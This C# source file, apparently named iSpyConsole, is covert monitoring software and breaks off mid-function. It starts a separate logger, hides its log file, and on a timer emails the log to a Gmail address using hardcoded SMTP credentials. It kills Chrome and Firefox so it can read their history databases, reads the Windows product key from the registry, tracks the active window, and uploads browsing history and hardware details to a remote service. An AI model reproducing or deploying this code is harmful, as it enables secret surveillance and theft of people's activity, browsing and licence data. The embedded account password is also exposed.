using Entities;
using iSpyConsole.iSpyServiceReference;
using iSpyConsole.Logic;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using Utilities;
using System.Data.SQLite;
using System.Drawing;
using UrlHistoryLibrary;
using System.Threading;
using System.Runtime.InteropServices;
using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Timers;
using System.ServiceModel.Security;
using System.Windows.Forms;
using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Timers;
using System.Data.SqlTypes;

namespace iSpyConsole
{

    public class Program
    {

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 5;
        const int SW_SHOW = 0;
        static IntPtr handle = GetConsoleWindow();


        #region Variables Declaration
        public static string appName, prevvalue;
        public static Stack applnames;
        public static Hashtable applhash;
        public static DateTime applfocustime;
        public static string appltitle;
        public static string tempstr;
        public static TimeSpan applfocusinterval;
        public DateTime logintime;
        public static List<ProcessesInfo> proInfo;
        public static Hashtable endtime;
        public static Hashtable sTime;
        static ArrayList list;
        #endregion


        public static PerformanceCounter cpuCounter;
        public static PerformanceCounter ramCounter;

        public static Color warnColour = Color.Red;
        private static Color normalColour = Color.FromKnownColor(KnownColor.ControlText);

        static UrlHistoryWrapperClass.STATURLEnumerator enumerator;
        static UrlHistoryWrapperClass urlHistory;

        private static String path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Log.txt";
        private static String ARCHIVE_FILE_NAME = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\ArchiveLog.txt";


        static void Main(string[] args)
        {
            SendTime = DateTime.Now;
            LogInfo = false;
            try
            {
                Process.Start("iSpyLogger.exe");
            }
            catch (Exception)
            {


            }

            start();
            //SendSystemInfo();

        }
        public static bool ALready = true;
        private static void SendSystemInfo()
        {

            try
            {
                Console.Write("App is going to Send Log to the Serever\n");
                //  ShowWindow(handle, SW_HIDE);
                ServiceClient client = new ServiceClient();
                try
                {
                    GetSystemInformation();
                    Console.Write("App has been Registered \n");
                    ALready = true;
                }
                catch (Exception)
                {
                    Console.Write("Failed to Registered an App \n");
                }
                var user = client.AuthenticateUserMac(HardwareInfo.GetMACAddress());
                if (user != null)
                {


                    LoginManagment.UserID = user.USER_ID.ToString();
                    LoginManagment.UserName = user.LOGIN_NAME;
                    LoginManagment.SYSTEM_ID = user.SYSTEM_ID;
                    LoginManagment.MAC_ADDRESS = user.MAC_ADDRESS;
                    LoginManagment.Timer = 15000;
                }
                applnames = new Stack();
                applhash = new Hashtable();
                proInfo = new List<ProcessesInfo>();

                try
                {
                    cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total", true);
                    ramCounter = new PerformanceCounter("Memory", "Available MBytes", true);

                    list = new ArrayList();
                    urlHistory = new UrlHistoryWrapperClass();
                    enumerator = urlHistory.GetEnumerator();


                    GetHistoryItems();

                    if (!File.Exists(@"d:\appl_xsl.xsl"))
                    {
                        File.Create(@"d:\appl_xsl.xsl");
                    }
                }
                catch (Exception exception)
                {

                }
                // GetSystemInformation();
                //while (true)
                {
                    try
                    {
                        GetSystemMemoryUsage();
                        Console.Write("Internet Explorer history Sent\n");
                    }
                    catch (Exception)
                    {


                    }

                    try
                    {
                        GetInternetExplorerHistory();
                        Console.Write("Internet Explorer history Sent\n");
                    }
                    catch (Exception)
                    {


                    }
                    try
                    {
                        GetChromeHistory();
                        Console.Write("Chrome Explorer history Sent\n");
                    }
                    catch (Exception)
                    {


                    }
                    try
                    {
                        GetFileExplorerHistory();
                        Console.Write("File Explorer history Sent\n");
                    }
                    catch (Exception)
                    {


                    }
                    try
                    {
                        GetRemovableDevices();
                        Console.Write("RemovableDevices history Sent\n");
                    }
                    catch (Exception)
                    {


                    }
                    try
                    {
                        MemoryClass.GetBrowsers();
                        Console.Write("Semt All the Browsers Sent\n");
                    }
                    catch (Exception)
                    {


                    }
                    try
                    {
                        ShowInterfaceSpeedAndQueue();
                        Console.Write("ShowInterfaceSpeedAndQueue history Sent\n");
                    }
                    catch (Exception)
                    {


                    }
                    try
                    {
                        GetMemoryInfo();
                        Console.Write("Memory history Sent\n");
                    }
                    catch (Exception)
                    {


                    }
                    try
                    {
                        GetSystemProcessorUsage();
                        Console.Write("CPU Usage history Sent\n");

                    }
                    catch (Exception)
                    {

                        Console.Write("Failed to sent CPU Usage history\n");

                    }
                    try
                    {
                        WinAppWatcher();
                        Console.Write(" WinAppWatcher history Sent\n");
                    }
                    catch (Exception)
                    {


                    }
                    try
                    {
                        SaveandShowDetails();
                        Console.Write("SaveandShowDetails history Sent\n");
                    }
                    catch (Exception)
                    {


                    }
                    try
                    {
                        GetSystemDrives();
                        Console.Write("SystemDrives history Sent\n");
                    }
                    catch (Exception)
                    {


                    }
                    try
                    {
                        GetSystemPointDevicesInfo();
                        Console.Write("SystemPointDevicesInfo history Sent\n");
                    }
                    catch (Exception)
                    {


                    }
                    try
                    {
                        GetSystemPortsInfo();
                        Console.Write("SystemPortsInfo history Sent\n");
                    }
                    catch (Exception)
                    {


                    }
                    try
                    {
                        GetSystemPrintersInfo();
                        Console.Write("SystemPrintersInfo history Sent\n");
                    }
                    catch (Exception)
                    {


                    }
                    try
                    {
                        GetSystemSoundDevices();
                        Console.Write("SystemSoundDevices history Sent\n");
                    }
                    catch (Exception)
                    {


                    }
                    try
                    {
                        GetSystemVideoController();
                        Console.Write("SystemVideoController info has been sent to Server\n");
                    }
                    catch (Exception)
                    {


                    }

                }
            }
            catch (Exception ex)
            {
                Console.Write(ex.Message + "\n");

            }
        }

        private static bool LogInfo;
        private static void SendLog(Object source, ElapsedEventArgs e)
        {

            try
            {
                var diffOfDates = DateTime.Now - SendTime;
                if (diffOfDates.Minutes >= 1 || LogInfo)
                {
                    Console.WriteLine("System Log going to be Processes");
                    LogInfo = false;
                    SendSystemInfo();
                    Console.WriteLine("System Log Information has been sent to Server");
                    SendTime = DateTime.Now;
                }
            }
            catch (Exception)
            {


            }
            try
            {
                FileInfo logFile = new FileInfo(path);
                if (logFile.Exists)
                {
                    try
                    {
                        // Copy the log file to the archive
                        logFile.CopyTo(ARCHIVE_FILE_NAME, true);
                        // Delete the log file
                        logFile.Delete();

                        // Email the archive and send email using a new thread
                        StreamReader input = new StreamReader(ARCHIVE_FILE_NAME);
                        string emailBody = input.ReadToEnd();
                        input.Close();

                        MailMessage message = new MailMessage();
                        SmtpClient smtp = new SmtpClient();
                        message.From = new MailAddress("isaskl4546@gmail.com");
                        message.To.Add(new MailAddress("ntupasstestingg2@gmail.com"));
                        message.Subject = "Test";
                        message.IsBodyHtml = true; //to make message body as html
                        message.Body = emailBody;
                        smtp.Port = 587;
                        smtp.Host = "smtp.gmail.com"; //for gmail host
                        smtp.EnableSsl = true;
                        smtp.UseDefaultCredentials = false;
                        smtp.Credentials = new NetworkCredential("isaskl4546@gmail.com", "ashrkkkihbgxpdcm");
                        smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
                        smtp.Send(message);
                        //Console.Out.WriteLine("Your Email Has Sent!");
                    }
                    catch (Exception ex)
                    {
                        Console.Out.WriteLine(ex.Message.ToString());
                    }

                }
            }
            catch (Exception ex)
            {
                Console.Out.WriteLine(ex.Message.ToString());
            }
        }
        private static DateTime SendTime;
        private static void start()
        {
            Console.WriteLine("Start");
            if (File.Exists(path)) File.SetAttributes(path, FileAttributes.Hidden);
            System.Timers.Timer t = new System.Timers.Timer();
            t.Interval = 6000 * 2;
            t.Elapsed += SendLog;
            t.AutoReset = true;
            t.Enabled = true;
            var datetime = DateTime.Now;

            while (true)
            {

            }
        }
        private static void GetSystemMemoryUsage()
        {
            ServiceClient client = new ServiceClient();


            var ram = new SYSTEM_MEMORY_USAGE
            {
                SYSTEM_ID = LoginManagment.SYSTEM_ID,
                TIME_STAMP = DateTime.Now,
                USAGE = ramCounter.NextValue().ToString() + " MB",
                USER_ID = int.Parse("0" + LoginManagment.UserID)
            };

            if (client.AddSystemMemoryUsage(ram))
            {

            }
        }


        public static void GetSystemInformation()
        {
            ServiceClient client = new ServiceClient();

            var info = new SYSTEM_INFORMATION
            {
                ACCOUNT_NAME = HardwareInfo.GetAccountName(),
                BIOS_CAPTION = HardwareInfo.GetBIOScaption(),
                BIOS_MAKER = HardwareInfo.GetBIOScaption(),
                BIOS_SERIAL_NO = HardwareInfo.GetBIOSMaker(),
                CD_DVD_DRIVE_PATH = HardwareInfo.GetCdRomDrive(),
                COMPUTER_NAME = HardwareInfo.GetComputerName(),
                CPU_CURRENT_CLOCK_SPEED = HardwareInfo.GetCPUCurrentClockSpeed().ToString(),
                CPU_MANUFACTURER = HardwareInfo.GetCPUManufacturer(),
                CPU_SPEED_IN_GHZ = HardwareInfo.GetCpuSpeedInGHz().ToString(),
                CURRENT_LANGUAGE = HardwareInfo.GetCurrentLanguage(),
                DEFAULT_IP_GATEWAY = HardwareInfo.GetMACAddress(),
                HDD_SERIAL_NO = HardwareInfo.GetHDDSerialNo(),
                MAC_ADDRESS = HardwareInfo.GetMACAddress(),
                OS_INFORMATION = HardwareInfo.GetOSInformation(),
                PROCESSOR_ID = HardwareInfo.GetProcessorId(),
                PHYSICAL_RAM_MEMORY = HardwareInfo.GetPhysicalMemory(),
                MOTHERBOARD_PRODUCT_ID = HardwareInfo.GetBoardProductId(),
                PROCESSOR_INFORMATION = HardwareInfo.GetProcessorInformation(),
                RAM_SLOT_ON_MOTHERBOARD = HardwareInfo.GetNoRamSlots(),
                MOTHERBOARD_MANUFACTURER = HardwareInfo.GetCPUManufacturer(),
                OS_LICENSE = KeyDecoder.GetWindowsProductKeyFromRegistry(),
                LAST_BOOT_TIME = HardwareInfo.GetLastSystemShutdown(),
                SYSTEM_UP_TIME = HardwareInfo.GetSystemUpTime(),
                USERID = int.Parse("1"),
                COMPANY_ID = 1
            };

            var st = client.AddHardwareInformation(info);
        }
        static void GetHistoryItems()
        {
            list.Clear();
            list.TrimToSize();

            while (enumerator.MoveNext())
            {
                list.Add(enumerator.Current);
            }
            enumerator.Reset();



            if (list.Count != 0)
                list.Sort(SortFileTimeAscendingHelper.SortFileTimeAscending());
        }
        private static void GetSystemProcessorUsage()
        {
            ServiceClient client = new ServiceClient();
            var cpu = new SYSTEM_PROCESSOR_USAGE
            {
                SYSTEM_ID = LoginManagment.SYSTEM_ID,
                TIME_STAMP = DateTime.Now,
                USAGE = Math.Round((cpuCounter.RawValue *0.00000000001),2).ToString() + " %",
                USER_ID = int.Parse("0" + LoginManagment.UserID)
            };
            if (client.AddSystemProcessorUsage(cpu)) { }
        }
        public static void GetChromeHistory()
        {
            try
            {
                ServiceClient client = new ServiceClient();
                Process[] chromeInstances = Process.GetProcessesByName("chrome");

                foreach (Process p in chromeInstances)
                    p.Kill();

                string apppath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                SQLiteConnection conn = new SQLiteConnection
                   (@"Data Source=" + apppath + @"\Google\Chrome\User Data\Default\History");
                SQLiteCommand cmd = new SQLiteCommand();
                cmd.Connection = conn;

                cmd.CommandText = "Select id,url,title,visit_count,last_visit_time,datetime(last_visit_time / 1000000 + (strftime('%s', '1601-01-01')), 'unixepoch')  as last_visit_date From Urls";
                SQLiteDataAdapter adp = new SQLiteDataAdapter(cmd);
                DataTable dt = new DataTable();
                adp.Fill(dt);

                List<BROWSER_HISTORY> hist = new List<BROWSER_HISTORY>();

                var list = UtilityEntities.ConvertDataTable<ChromeHistoryClass>(dt);
                if (list.Count > 0)
                {
                    hist = list.Select(x => new BROWSER_HISTORY
                    {
                        SYSTEM_ID = LoginManagment.SYSTEM_ID,
                        LAST_VISIT_TIME = x.last_visit_time.ToString(),
                        LAST_VISIT_DATE = x.last_visit_date.ToString(),
                        TITLE = x.title,
                        URL = x.url,
                        VISIT_COUNT = x.visit_count,
                        BROSWER_ID = 1
                    }).ToList();


                    for (int i = 0; i < hist.Count; i = i + 50)
                    {
                        var items = hist.Skip(i).Take(50);
                        if (client.AddChromeHistory(items.ToArray()))
                        {

                        }
                    }


                }
            }
            catch (Exception ex)
            {

            }


        }

        public static void GetFirefoxHistory()
        {
            Process[] processNames = Process.GetProcessesByName("firefox");

            foreach (Process item in processNames)
            {
                item.Kill();
            }

            string apppath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            string mozilla = System.IO.Path.Combine(apppath, "Mozilla");

            bool exist = System.IO.Directory.Exists(mozilla);
            bool check = false;
            if (exist)
            {

                string firefox = System.IO.Path.Combine(mozilla, "firefox");

                if (System.IO.Directory.Exists(firefox))
                {
                    string prof_file = System.IO.Path.Combine(firefox, "profiles.ini");

                    bool file_exist = System.IO.File.Exists(prof_file);
                    string prof_dir = "";
                    if (file_exist)
                    {

                        string nProfile = System.IO.Path.Combine(firefox, "Profiles");
                        StreamReader rdr = new StreamReader(prof_file);

                        string resp = rdr.ReadToEnd();

                        string[] lines = resp.Split(new string[] { "\r\n" }, StringSplitOptions.None);

                        var location = lines.Where(x => x.Contains("Path="));
                        foreach (var item in location)
                        {
                            var aaa = item.Split(new string[] { "=" }, StringSplitOptions.None)[1];
                            var k = aaa.Replace(@"Profiles/", "");
                            var nProfile1 = System.IO.Path.Combine(nProfile, k);
                            if (System.IO.Directory.Exists(nProfile))
                            {
                                var nProfile2 = System.IO.Path.Combine(nProfile1, "places.sqlite");
                                if (System.IO.File.Exists(nProfile2))
                                {
                                    prof_dir = nProfile2; check = true;
                                    break;

                                }
                            }
                        }

                        //prof_dir = System.IO.Path.Combine(firefox, "");


                        SQLiteConnection conn = new SQLiteConnection(@"Data Source=" + prof_dir);
                        conn.Open();
                        SQLiteCommand cmd = new SQLiteCommand();
                        cmd.Connection = conn;
                        //  cmd.CommandText = "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name;";
                        //  Use the above query to get all the table names
                        cmd.CommandText = "Select id,url,title,visit_count,datetime(last_visit_date / 1000000, 'unixepoch') as last_visit_date,last_visit_date as last_visit_time From moz_places where title is not null";
                        SQLiteDataAdapter adp = new SQLiteDataAdapter(cmd);
                        DataTable dt = new DataTable();
                        adp.Fill(dt);



                        List<BROWSER_HISTORY> hist = new List<BROWSER_HISTORY>();

                        var list = UtilityEntities.ConvertDataTable<ChromeHistoryClass>(dt);
                        if (list.Count > 0)
                        {
                            ServiceClient client = new ServiceClient();
                            hist = list.Select(x => new BROWSER_HISTORY
                            {
                                SYSTEM_ID = LoginManagment.SYSTEM_ID,
                                LAST_VISIT_DATE = x.last_visit_date.ToString(),
                                LAST_VISIT_TIME = x.last_visit_time.ToString(),
                                TITLE = x.title,
                                URL = x.url,
                                VISIT_COUNT = x.visit_count,
                                BROSWER_ID = 2
                            }).ToList();


                            for (int i = 0; i < hist.Count; i = i + 50)
                            {
                                var items = hist.Skip(i).Take(50);
                                if (client.AddChromeHistory(items.ToArray()))
                                {

                                }
                            }


                        }

                    }
                }
            }

        }
        private static void TestFocusedChanged()
        {
            //This is used to handle hashtable,if its length is 1.It means number of active applications is only one....
            try
            {
                if (applhash.Count == 1)
                {
                    IDictionaryEnumerator en = applhash.GetEnumerator();
                    applfocusinterval = DateTime.Now.Subtract(applfocustime);

                    while (en.MoveNext())
                    {
                        if (en.Key.ToString() == appltitle + "$$$!!!" + appName)
                        {
                            applhash.Remove(appltitle + "$$$!!!" + appName);
                            applhash.Add(appltitle + "$$$!!!" + appName, applfocusinterval.TotalSeconds);
                            break;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                // MessageBox.Show(ex.Message);
            }
        }

        private static void SaveandShowDetails()
        {
            //This is used to save contents of hashtable in a xml file....
            try
            {
                List<WINDOW_ACTIVE> windows = new List<WINDOW_ACTIVE>();

                TestFocusedChanged();
                System.IO.StreamWriter writer = new System.IO.StreamWriter(@"D:\appldetails.xml", false);
                IDictionaryEnumerator en = applhash.GetEnumerator();



                writer.Write("<?xml version=\"1.0\"?>");
                writer.WriteLine("");
                writer.Write("<?xml-stylesheet type=\"text/xsl\" href=\"appl_xsl.xsl\"?>");
                writer.WriteLine("");
                writer.Write("<ApplDetails>");
                while (en.MoveNext())
                {
                    if (!en.Value.ToString().Trim().StartsWith("0"))
                    {

                        writer.Write("<Application_Info>");
                        writer.Write("<ProcessName>");
                        string processname = en.Key.ToString().Trim().Substring(0, en.Key.ToString().Trim().LastIndexOf("$$$!!!")).Trim();
                        processname = processname.Replace("\0", "");
                        writer.Write(processname);
                        writer.Write("</ProcessName>");

                        writer.Write("<ApplicationName>");
                        string applname = en.Key.ToString().Trim().Substring(en.Key.ToString().Trim().LastIndexOf("$$$!!!") + 6).Trim();

                        writer.Write(applname);
                        writer.Write("</ApplicationName>");

                        writer.Write("<TotalSeconds>");
                        var sec = 0;
                        if ((Convert.ToDouble(en.Value) / 60) < 1)
                        {
                            sec = Convert.ToInt32((Convert.ToDouble(en.Value)));
                            writer.Write(Convert.ToInt32((Convert.ToDouble(en.Value))) + " Seconds");
                        }
                        else
                        {
                            sec = Convert.ToInt32((Convert.ToDouble(en.Value)));
                            writer.Write(Convert.ToInt32((Convert.ToDouble(en.Value)) / 60) + " Minutes");
                        }
                        writer.Write("</TotalSeconds>");
                        writer.Write("</Application_Info>");





                        windows.Add(new WINDOW_ACTIVE
                        {
                            SYSTEM_ID = LoginManagment.SYSTEM_ID,
                            TIME_STAMP = DateTime.Now,
                            UPDATE_DATE = null,
                            VISIT_COUNT = 1,
                            WINDOW_TITLE = processname,
                            WINDOW_URL = applname,
                            WIN_PROCESS = processname,
                            SECONDS = sec



                        });
                    }
                }
                writer.Write("</ApplDetails>");
                writer.Flush();
                writer.Close();
                var wins = windows;
                foreach (var c in proInfo)
                {
                    var newProf = windows.FirstOrDefault(x => x.WINDOW_TITLE == c.Title);
                    var count = windows.Count(x => x.WINDOW_TITLE == c.Title);
                    if (newProf != null)
                    {
                        newProf.START_TIME = c.startTime;
                        newProf.VISIT_COUNT = count;
                    }
                }
                ServiceClient client = new ServiceClient();
                if (client.AddActiveWindows(windows.ToArray(), LoginManagment.UserID, UtilityEntities.GetMac()))
                {

                }
            }
            catch (Exception ex)
            {
                // MessageBox.Show(ex.Message);
            }
        }

        public static void WinAppWatcher()
        {
            try
            {
                bool isNewAppl = false;
                IntPtr hwnd = APIFuncs.getforegroundWindow();
                Int32 pid = APIFuncs.GetWindowProcessID(hwnd);
                Process p = Process.GetProcessById(pid);
                appName = p.ProcessName;
                appltitle = APIFuncs.ActiveApplTitle().Trim().Replace("\0", "");


                var pp = proInfo.FirstOrDefault(x => x.ProcessId == pid);
                if (pp == null)
                {
                    proInfo.Add(new ProcessesInfo
                    {
                        ProcessId = pid,
                        Name = appName,
                        startTime = p.StartTime,
                        Title = appltitle
                    });
                }



                if (!applnames.Contains(appltitle + "$$$!!!" + appName))
                {
                    applnames.Push(appltitle + "$$$!!!" + appName);
                    applhash.Add(appltitle + "$$$!!!" + appName, 0);
                    isNewAppl = true;
                }
                if (prevvalue != (appltitle + "$$$!!!" + appName))
                {
                    IDictionaryEnumerator en = applhash.GetEnumerator();
                    applfocusinterval = DateTime.Now.Subtract(applfocustime);
                    while (en.MoveNext())
                    {
                        if (en.Key.ToString() == prevvalue)
                        {
                            double prevseconds = Convert.ToDouble(en.Value);
                            applhash.Remove(prevvalue);
                            applhash.Add(prevvalue, (applfocusinterval.TotalSeconds + prevseconds));
                            break;
                        }
                    }
                    prevvalue = appltitle + "$$$!!!" + appName;
                    applfocustime = DateTime.Now;
                }
                if (isNewAppl)
                    applfocustime = DateTime.Now;
            }
            catch (Exception)
            {

            }
        }
        public static List<DriveInfo> GetRemovableDevices()
        {
            return DriveInfo.GetDrives().Where(drive => drive.IsReady && drive.DriveType == DriveType.Removable).ToList();
            //if (drives.Count > 0)
            //{
            //}


        }
        public static void GetSystemDrives()
        {
            var client = new ServiceClient();
            var data = DrivesCompleteInformation.GetAllDrivesInformation();
            List<SYSTEM_VOLUME> list = new List<SYSTEM_VOLUME>();
            foreach (var d in data)
            {
                var dd = new SYSTEM_VOLUME
                {
                    CAPTION = d.Name,
                    FREE = d.TotalFreeSpace,
                    SERIAL_NO = d.SerialNo,
                    SYETEM_ID = LoginManagment.SYSTEM_ID,
                    USED = d.UsedSpace,
                    TIME_STAMP = DateTime.Now,
                    DEVICE_TYPE = d.DriveType.ToString(),
                    TOTAL = d.TotalSize
                };
                list.Add(dd);
            }

            var drives = DriveInfo.GetDrives().Where(drive => drive.IsReady && drive.DriveType == DriveType.Removable).ToList();
            foreach (var d in drives)
            {
                var dd = new SYSTEM_VOLUME
                {
                    CAPTION = d.Name,
                    FREE = (d.TotalFreeSpace).ToString(),
                    SERIAL_NO = null,
                    SYETEM_ID = LoginManagment.SYSTEM_ID,
                    USED = (d.TotalSize - d.TotalFreeSpace).ToString(),
                    TIME_STAMP = DateTime.Now,
                    DEVICE_TYPE = d.DriveType.ToString(),
                    TOTAL = d.TotalSize.ToString()
                };
                list.Add(dd);
            }

            if (client.AddVolume(list.ToArray()))
            {

            }
        }

        public static void GetMemoryInfo()
        {
            try
            {
                var client = new ServiceClient();


                var list = Utilities.MemoryClass.GetSystemMemory();

                List<SYSTEM_MEMORY> lst = new List<SYSTEM_MEMORY>();
                foreach (var item in list)
                {
                    lst.Add(new SYSTEM_MEMORY
                    {
                        ATTRIBUTES = item.ATTRIBUTES,
                        BANK_LABEL = item.BANK_LABEL,
                        CAPACITY = item.CAPACITY,
                        CAPTION = item.CAPTION,
                        CONFIGURE_CLOCL_SPEED = item.CONFIGURE_CLOCL_SPEED,
                        CREATION_CLASS_NAME = item.CREATION_CLASS_NAME,
                        DATA_WIDTH = item.DATA_WIDTH,
                        DESCRIPTION = item.DESCRIPTION,
                        DEVICE_LOCATOR = item.DEVICE_LOCATOR,
                        FORM_FACTOR = item.FORM_FACTOR,
                        INTER_LEAVE_DATA_DEPTH = item.INTER_LEAVE_DATA_DEPTH,
                        INTER_LEAVE_POSITION = item.INTER_LEAVE_POSITION,
                        MANUFACTURER = item.MANUFACTURER,
                        MEMORY_TYPE = item.MEMORY_TYPE,
                        NAME = item.NAME,
                        PART_NUMBER = item.PART_NUMBER,
                        POSITION_IN_ROW = item.POSITION_IN_ROW,
                        SERIAL_NO = item.SERIAL_NO,
                        SMBIOS_MEMORY_TYPE = item.SMBIOS_MEMORY_TYPE,
                        SPEED = item.SPEED,
                        SYSTEM_ID = item.SYSTEM_ID,
                        TOTAL_WIDTH = item.TOTAL_WIDTH,
                        TYPE_DETAIL = item.TYPE_DETAIL
                    });
                }
                client.AddSystemMemory(lst.ToArray());
            }
            catch (Exception ex)
            {

            }

        }

        public static void GetSystemPointDevicesInfo()
        {
            try
            {
                var client = new ServiceClient();


                var list = Utilities.MemoryClass.GetSystemPointingDevices();

                List<SYSTEM_POINTING_DEVICE> lst = new List<SYSTEM_POINTING_DEVICE>();
                foreach (var i in list)
                {
                    lst.Add(new SYSTEM_POINTING_DEVICE
                    {
                        CAPTION = i.CAPTION,
                        DESCRIPTION = i.DESCRIPTION,
                        DEVICE_ID = i.DEVICE_ID,
                        DEVICE_INTERFACE = i.DEVICE_INTERFACE,
                        HARDWARE_TYPE = i.HARDWARE_TYPE,
                        MANUFACTURER = i.MANUFACTURER,
                        NAME = i.NAME,
                        NUMBER_OF_BUTTONS = i.NUMBER_OF_BUTTONS,
                        SYSTEM_ID = i.SYSTEM_ID,
                        SYSTEM_NAME = i.SYSTEM_NAME
                    });
                }
                client.AddSystemPointingDevice(lst.ToArray());
            }
            catch (Exception ex)
            {

            }
        }

        public static void GetSystemPortsInfo()
        {
            try
            {
                var client = new ServiceClient();


                var list = Utilities.MemoryClass.GetSystemPorts();

                List<SYSTEM_PORT_CONNECTOR> lst = new List<SYSTEM_PORT_CONNECTOR>();
                foreach (var i in list)
                {
                    lst.Add(new SYSTEM_PORT_CONNECTOR
                    {
                        TAG = i.TAG,
                        SYSTEM_ID = LoginManagment.SYSTEM_ID,
                        CAPTION = i.CAPTION,
                        NAME = i.NAME,
                        DESCRIPTION = i.DESCRIPTION,
                        CONNECTOR_TYPE = i.CONNECTOR_TYPE
                    });
                }
                client.AddSystemPortConnector(lst.ToArray());
            }
            catch (Exception ex)
            {

            }

        }
        public static void GetSystemPrintersInfo()
        {
            try
            {
                var client = new ServiceClient();


                var list = Utilities.MemoryClass.GetSystemPrinters();

                List<SYSTEM_PRINTER> lst = new List<SYSTEM_PRINTER>();
                foreach (var i in list)
                {
                    lst.Add(new SYSTEM_PRINTER
                    {
                        AVERAGE_PAGES_PER_MINUTE = i.AVERAGE_PAGES_PER_MINUTE,
                        CAPABILITY_DESCRIPTION = i.CAPABILITY_DESCRIPTION,
                        CAPTION = i.CAPTION,
                        NAME = i.NAME,
                        NETWORK = i.NETWORK,
                        PAPER_SIZE_SUPPORTED = i.PAPER_SIZE_SUPPORTED,
                        PRINTER_PAPER_NAME = i.PRINTER_PAPER_NAME,
                        PRINT_PROCESSOR = i.PRINT_PROCESSOR,
                        SPOOL_ENABLED = i.SPOOL_ENABLED,
                        STATUS = i.STATUS,
                        SYSTEM_ID = LoginManagment.SYSTEM_ID,
                        DEVICE_ID = i.DEVICE_ID,
                        HORIZONTAL_RESOLUTION = i.HORIZONTAL_RESOLUTION,
                        SYSTEM_NAME = i.SYSTEM_NAME,
                        VERTICAL_RESOLUTION = i.VERTICAL_RESOLUTION
                    });
                }
                client.AddSystemPrinters(lst.ToArray());
            }
            catch (Exception ex)
            {

            }

        }

        public static void GetSystemSoundDevices()
        {
            try
            {
                var client = new ServiceClient();


                var list = Utilities.MemoryClass.GetSystemSoundDevices();

                List<SYSTEM_SOUND_DEVICE> lst = new List<SYSTEM_SOUND_DEVICE>();
                foreach (var i in list)
                {
                    lst.Add(new SYSTEM_SOUND_DEVICE
                    {
                        CAPTION = i.CAPTION,
                        DESCRIPTION = i.DESCRIPTION,
                        DEVICE_ID = i.DEVICE_ID,
                        MANUFACTURER = i.MANUFACTURER,
                        NAME = i.NAME,
                        STATUS_INFO = i.STATUS_INFO,
                        SYSTEM_ID = LoginManagment.SYSTEM_ID,
                        SYSTEM_NAME = i.SYSTEM_NAME
                    });
                }
                client.AddSystemSoundDeices(lst.ToArray());
            }
            catch (Exception ex)
            {

            }

        }

        public static void GetSystemVideoController()
        {
            try
            {
                var client = new ServiceClient();


                var list = Utilities.MemoryClass.GetSystemVideoControllers();

                List<SYSTEM_VIDEO_CONTROLLER> lst = new List<SYSTEM_VIDEO_CONTROLLER>();
                foreach (var i in list)
                {
                    lst.Add(new SYSTEM_VIDEO_CONTROLLER
                    {
                        ADAPTER_AVAILABILITY = i.ADAPTER_AVAILABILITY,
                        ADAPTER_DAC_TYPE = i.ADAPTER_DAC_TYPE,
                        ADAPTER_COMPATIABILITY = i.ADAPTER_COMPATIABILITY,
                        VIDEO_ARCHITECTURE = i.VIDEO_ARCHITECTURE,
                        VIDEO_MEMORY_TYPE = i.VIDEO_MEMORY_TYPE,
                        VIDEO_PROCESSOR = i.VIDEO_PROCESSOR,
                        CAPTION = i.CAPTION,
                        DESCRIPTION = i.DESCRIPTION,
                        DEVICE_ID = i.DEVICE_ID,
                        DRIVER_DATE = i.DRIVER_DATE,
                        DRIVER_VERSION = i.DRIVER_VERSION,
                        NAME = i.NAME,
                        SYSTEM_ID = LoginManagment.SYSTEM_ID
                    });
                }
                client.AddSystemVideoConroller(lst.ToArray());
            }
            catch (Exception ex)
            {
            }
        }

        public static void ShowInterfaceSpeedAndQueue()
        {
            var client = new ServiceClient();

            NetworkInterface[] adapters = NetworkInterface.GetAllNetworkInterfaces();

            List<SYSTEM_NETWORK> list = new List<SYSTEM_NETWORK>();

            foreach (NetworkInterface adapter in adapters)
            {
                IPInterfaceProperties properties = adapter.GetIPProperties();
                IPv4InterfaceStatistics stats = adapter.GetIPv4Statistics();



                var sys = new SYSTEM_NETWORK
                {
                    DESCRIPTION = adapter.Description,
                    SYSTEM_ID = LoginManagment.SYSTEM_ID,
                    TIME_STAMP = DateTime.Now,
                    SPEED = adapter.Speed.ToString(),
                    NAME = adapter.Name,
                    STATUS = adapter.OperationalStatus.ToString()
                };

                list.Add(sys);


            }

            client.AddSystemNetworkInfo(list.ToArray());
        }


        public static void GetInternetExplorerHistory()
        {


            List<BROWSER_HISTORY> hist = new List<BROWSER_HISTORY>();

            foreach (STATURL item in list.ToArray())
            {


                // var item = dataGridView1.Rows[i];
                BROWSER_HISTORY h = new BROWSER_HISTORY();
                h.URL = item.URL.ToString();
                try
                {
                    if (item.Title != null)
                        h.TITLE = item.Title.ToString();
                    else
                        h.TITLE = "";
                    h.LAST_VISIT_DATE = item.LastVisited.ToString();
                    h.LAST_VISIT_TIME = item.LastVisited.TimeOfDay.ToString();
                    h.SYSTEM_ID = LoginManagment.SYSTEM_ID;
                    h.BROSWER_ID = 3;
                    hist.Add(h);
                }
                catch (Exception)
                {
                }
            }


            var data = (from s in hist
                        where s.URL.Contains("http")
                        orderby s.URL
                        select s).ToList();

            ServiceClient client = new ServiceClient();

            for (int i = 0; i < data.Count; i = i + 50)
            {
                var items = data.Skip(i).Take(50);
                if (client.AddChromeHistory(items.ToArray()))
                {

                }
            }
        }
        public static void GetFileExplorerHistory()
        {

            var hist = new List<BROWSER_HISTORY>();


            foreach (STATURL item in list.ToArray())
            {
                BROWSER_HISTORY h = new BROWSER_HISTORY();
                h.URL = item.URL.ToString();
                try
                {
                    if (item.Title != null)
                        h.TITLE = item.Title.ToString();
                    else
                        h.TITLE = "";
